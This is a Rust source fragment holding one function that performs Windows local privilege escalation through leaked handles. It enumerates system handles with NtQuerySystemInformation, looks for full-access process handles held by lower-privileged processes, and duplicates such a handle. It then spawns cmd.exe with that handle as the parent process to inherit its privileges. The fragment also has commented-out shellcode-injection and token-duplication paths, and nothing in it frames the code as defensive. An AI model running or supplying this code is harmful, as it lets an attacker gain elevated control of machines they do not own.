pub fn getvulnprocesshandles(){
    unsafe{

        let mut i =0;
        let mut bytesneeded = 0;
        
        let mut buffer = loop{
            
            let mut buffer = vec![0u8;bytesneeded as usize];
            let ntstatus2 =  NtQuerySystemInformation(SystemHandleInformation, 
                buffer.as_mut_ptr() as *mut c_void, 
                bytesneeded, 
                &mut bytesneeded);

                //println!("bytes needed: {}",bytesneeded);


                if NT_SUCCESS(ntstatus2)  {
                    break buffer;
                }
                if  !NT_SUCCESS(ntstatus2){
                    //println!("NtQuerySystemInformation failed: {}",ntstatus2);
                    i+=1;
                }   
        };

        println!("bytesneeded: {}",bytesneeded);
       
       
        let  handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);

        println!("number of handles: {}",handleinfo.NumberOfHandles);

        let allprochandles = getallprochandles().unwrap();
        
        
        let mut tableentries:Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO> = Vec::new();
        for i in 0..handleinfo.NumberOfHandles  {

            let tableentry = *(((buffer.as_mut_ptr() as usize + 8 + (i as usize 
                * std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())))as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);
        
            tableentries.push(tableentry.clone());
            
        }

        

        let procaddresshandles = tableentries.clone();
        

        let mut pids = vec![0u16;1000];
       
       

        for i in 0..tableentries.len(){

             
            if tableentries[i].ObjectTypeIndex !=0x7{
                continue;
            }

            /*if tableentries[i].UniqueProcessId == 22444 ||tableentries[i].UniqueProcessId==13792 {
                println!("process id of low priv process: {}",tableentries[i].UniqueProcessId);
                println!("object address: {:x?}",tableentries[i].Object);
                println!("handle value: {:x?}",tableentries[i].HandleValue);
                println!("granted access: {:x?}",tableentries[i].GrantedAccess);
            }*/
            if tableentries[i].UniqueProcessId == GetCurrentProcessId() as u16{
                continue;
            }

            /*if tableentries[i].GrantedAccess == 0x0012019f
                && tableentries[i].GrantedAccess != 0x00120189
                && tableentries[i].GrantedAccess != 0x120089
                && tableentries[i].GrantedAccess != 0x1A019F{
                    continue;
                }*/

            if tableentries[i].GrantedAccess!=PROCESS_ALL_ACCESS 
            {
                continue;
            }
            

            let phandle = OpenProcess(PROCESS_ALL_ACCESS, 0,tableentries[i].UniqueProcessId as u32);
            if phandle.is_null(){
                continue;
            }
            CloseHandle(phandle);
            

            for j in 0..procaddresshandles.len(){
                if procaddresshandles[j].UniqueProcessId==tableentries[i].UniqueProcessId{
                    continue;
                }
                if procaddresshandles[j].ObjectTypeIndex!=0x7{
                    continue;
                }
                if procaddresshandles[j].GrantedAccess!=PROCESS_ALL_ACCESS{
                    continue;
                }

                if procaddresshandles[j].UniqueProcessId ==4||
                procaddresshandles[j].UniqueProcessId ==14384||
                // crss.exe pid
                procaddresshandles[j].UniqueProcessId ==17980{
                    continue;
                }
               

                if procaddresshandles[j].Object as usize== tableentries[i].Object as usize{
                    let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0,procaddresshandles[j].UniqueProcessId as u32);
                    if prochandle.is_null(){
                        println!("our equal level processid: {}: {}",tableentries[i].UniqueProcessId,procaddresshandles[j].UniqueProcessId);
                        println!("our equal level process handle value: {:x?}",tableentries[i].HandleValue);
                        println!("phandle: {:x?}",phandle);
                        println!("our equal level object: {:x?}",tableentries[i].Object);
                        println!("our granted access: {:x?}",tableentries[j].GrantedAccess);
                        println!("other process id: {}",procaddresshandles[j].UniqueProcessId);
                        println!("other granted access: {:x?}",procaddresshandles[j].GrantedAccess);
                       
                        pids.push(tableentries[i].UniqueProcessId);
                        /*for (k,v) in &allprochandles{
                            if *v as usize==procaddresshandles[j].HandleValue as usize{
                                println!("{}: {:x?}",k,*v as usize);
                            }
                        }*/

                        let phandle = OpenProcess(PROCESS_DUP_HANDLE, 0, tableentries[i].UniqueProcessId as u32);
                        if phandle.is_null(){
                            continue;
                        }
                        let mut clonedhandle = 0 as *mut c_void;
                        let res = DuplicateHandle(phandle, tableentries[i].HandleValue as *mut c_void, GetCurrentProcess(), &mut clonedhandle, 0, 0, DUPLICATE_SAME_ACCESS);
                        if res == 0{
                            println!("duplicatehandle failed: {}",GetLastError());
                            CloseHandle(phandle);
                            CloseHandle(clonedhandle);
                            println!();
                            continue;
                        }
                        println!("clonedhandle: {:x?}",clonedhandle);
                        //shellcodeinject(clonedhandle);
                        /*if tableentries[i].HandleValue!=0xc8 &&
                            procaddresshandles[j].UniqueProcessId!=31500{
                            CloseHandle(phandle);
                            CloseHandle(clonedhandle);
                            println!();
                            continue;
                        }*/
                        
                        let mut sizeneeded = 0;
                        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0,&mut sizeneeded );

                        println!("sizeneeded: {}",sizeneeded);
                        let mut plist = vec![0u8;sizeneeded];
                        InitializeProcThreadAttributeList(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0,&mut sizeneeded );

                        UpdateProcThreadAttribute(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST,
                             0, 
                             0x00020000, 
                             clonedhandle, 
                             4, 
                             std::ptr::null_mut(), 
                             std::ptr::null_mut());

                         let mut sinfo = std::mem::zeroed::<STARTUPINFOEXW>();
                         sinfo.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
                         sinfo.lpAttributeList = plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST;

                        let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();

                        let res = CreateProcessW("C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,
                             std::ptr::null_mut(), 
                             std::ptr::null_mut(), 
                             std::ptr::null_mut(), 
                             1, 
                             EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE,
                             std::ptr::null_mut(), 
                             std::ptr::null_mut(), 
                             &mut sinfo.StartupInfo,
                              &mut pinfo);
                    
                        if res==0{
                            println!("createprocessw failed: {}",GetLastError());
                            CloseHandle(phandle);
                            CloseHandle(clonedhandle);
                            println!();
                            continue;
                        }
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);

                        CloseHandle(phandle);
                        CloseHandle(clonedhandle);
                        println!();
                        continue;
                    }
                    
                   
                   
                    
                }

            }

            

            /*let mut prochandle = 0 as *mut c_void;
            prochandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_DUP_HANDLE, 0, tableentries[i].UniqueProcessId as u32);
            if prochandle.is_null() {
                //println!("prochandle: {:x?}",prochandle);
                // we dont want higher privileged processes
                continue;
            }

            //println!("enumerating");
            // checking handles of low privileged process,
            // checking if it has any interesting handles
            if tableentries[i].GrantedAccess == PROCESS_ALL_ACCESS ||
            tableentries[i].GrantedAccess == PROCESS_CREATE_PROCESS ||
            tableentries[i].GrantedAccess == PROCESS_DUP_HANDLE ||
            tableentries[i].GrantedAccess == PROCESS_CREATE_THREAD||
            tableentries[i].GrantedAccess == PROCESS_VM_WRITE{

                // now we check the process of that handle
                for j in 0..process1handles.len(){
                    if process1handles[j].ObjectTypeIndex!=0x7{
                        continue;
                    }
                    if process1handles[j].UniqueProcessId==tableentries[i].UniqueProcessId{
                        continue;
                    }

                    if tableentries[i].Object == process1handles[j].Object{
                        let handle1 = process1handles[j].HandleValue;
                        for (k,v) in &allprochandles{
                            if handle1 == *v as u16{
                                let mut proc1handle = 0 as *mut c_void; 
                                proc1handle = OpenProcess(PROCESS_ALL_ACCESS, 0, *k);
                                if  proc1handle.is_null(){
                                    println!("you might wanna check this process out");
                                    println!("process id of low priv process: {}",tableentries[i].UniqueProcessId);
                                    println!("object address: {:x?}",tableentries[i].Object);
                                    println!("handle value: {:x?}",tableentries[i].HandleValue);
                                    println!("granted access: {:x?}",tableentries[i].GrantedAccess);
                                    println!("objectaddress: {:x?}",process1handles[j].Object);
                                    println!("handle value j: {:x?}",process1handles[j].HandleValue);
                                    println!("Process id: {}",k);
                                    println!("handle: {:x?}",v);
                                    

                                    /*let proc2handle = OpenProcess(tableentries[i].GrantedAccess, 0, tableentries[i].UniqueProcessId as u32);
                                    //println!("proc2handle: {:x?}, getlasterror: {}",proc2handle,GetLastError());
                                    if proc2handle.is_null(){
                                        continue;
                                    }
                                    println!("proc2handle: {:x?}",proc2handle);*/
                                    let mut targethandle = 0 as *mut c_void;
                                    DuplicateHandle(prochandle, prochandle, GetCurrentProcess(), &mut targethandle, 0, 0, DUPLICATE_SAME_ACCESS);
                                    if targethandle.is_null(){
                                        println!("duplicatehandle failed: {}",GetLastError());
                                    }
                                    /*let mut token2handle = 0 as *mut c_void;
                                     OpenProcessToken(proc2handle, TOKEN_ALL_ACCESS, &mut token2handle);
                                    duplicatetokenandspawn(token2handle);*/
                                    //CloseHandle(proc2handle);
                                    println!("");
                                }
                                CloseHandle(proc1handle);
                                

                            }
                        }
                    }*/



        }
        println!("{:?}",pids.into_iter().unique().collect::<Vec<u16>>());

            /*if tableentry.GrantedAccess == PROCESS_ALL_ACCESS ||
                tableentry.GrantedAccess == PROCESS_CREATE_PROCESS ||
                tableentry.GrantedAccess == PROCESS_DUP_HANDLE ||
                tableentry.GrantedAccess == PROCESS_CREATE_THREAD||
                tableentry.GrantedAccess == PROCESS_VM_WRITE{

                

                if tableentry.UniqueProcessId == GetCurrentProcessId() as u16{
                    continue;
                }



                    println!("Process ID: {}",tableentry.UniqueProcessId);
                    println!("Handle Value: {:x?}",tableentry.HandleValue);
                    println!("Object: {:x?}",tableentry.Object);
                    println!("Granted Access: {:x?}",tableentry.GrantedAccess);
                    println!();*/

                /*let prochandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, tableentry.UniqueProcessId as u32);
                if prochandle.is_null(){
                    //println!("Openprocessfailed: {}",GetLastError());
                    continue;
                }
                let mut tokenhandle = 0 as *mut c_void;
                let res = OpenProcessToken(prochandle, TOKEN_QUERY, &mut tokenhandle);
                if tokenhandle ==0 as *mut c_void{
                    CloseHandle(prochandle);
                    continue;
                }

                let res = gettokenintegritylevel(tokenhandle);
                if res.is_err(){
                    continue;
                }

               

                let integritylevel = res.ok().unwrap();
                if integritylevel.to_lowercase().contains("high mandatory level") ||
                integritylevel.to_lowercase().contains("high mandatory level") {
                    println!("Process ID: {}",tableentry.UniqueProcessId);
                    println!("Handle Value: {:x?}",tableentry.HandleValue);
                    println!("Object: {:x?}",tableentry.Object);
                    println!("Granted Access: {:x?}",tableentry.GrantedAccess);
                    println!("Process integrity level: {}",integritylevel);
                    println!("{}", gettokenuserinfo(tokenhandle).unwrap());
                    println!();
                }   */
                

        /*for i in 0..tableentries.len(){
            if tableentries[i].ObjectTypeIndex!=0x7{
                continue;
            }
            let tempobjectaddress = tableentries[i].Object;

            for j in 0..tableentries.len(){
                if process1handles[j].UniqueProcessId == tableentries[i].UniqueProcessId{
                    continue;
                }
                if tableentries[i].GrantedAccess != PROCESS_ALL_ACCESS ||
            tableentries[i].GrantedAccess != PROCESS_CREATE_PROCESS ||
            tableentries[i].GrantedAccess != PROCESS_DUP_HANDLE ||
            tableentries[i].GrantedAccess != PROCESS_CREATE_THREAD||
            tableentries[i].GrantedAccess != PROCESS_VM_WRITE{

            }

                if process1handles[j].Object == tempobjectaddress{
                    println!("----------------------");
                    println!("Process ID: {}",tableentries[i].UniqueProcessId);
                        println!("Handle Value: {:x?}",tableentries[i].HandleValue);
                        println!("Object: {:x?}",tableentries[i].Object);
                        println!("Granted Access: {:x?}",tableentries[i].GrantedAccess);
                        

                    println!("Process ID: {}",process1handles[j].UniqueProcessId);
                        println!("Handle Value: {:x?}",process1handles[j].HandleValue);
                        println!("Object: {:x?}",process1handles[j].Object);
                        println!("Granted Access: {:x?}",process1handles[j].GrantedAccess);
                        println!("----------------------");
                        println!();
                }

            }

            /*if tableentries[i].GrantedAccess == PROCESS_ALL_ACCESS ||
            tableentries[i].GrantedAccess == PROCESS_CREATE_PROCESS ||
            tableentries[i].GrantedAccess == PROCESS_DUP_HANDLE ||
            tableentries[i].GrantedAccess == PROCESS_CREATE_THREAD||
            tableentries[i].GrantedAccess == PROCESS_VM_WRITE{
                if tableentries[2].Object == tableentries[i].Object{
                    println!("Process ID: {}",tableentries[i].UniqueProcessId);
                        println!("Handle Value: {:x?}",tableentries[i].HandleValue);
                        println!("Object: {:x?}",tableentries[i].Object);
                        println!("Granted Access: {:x?}",tableentries[i].GrantedAccess);
                        println!();
                }
            }*/
            
        }*/
            
            
        


        
        }

    

    
}

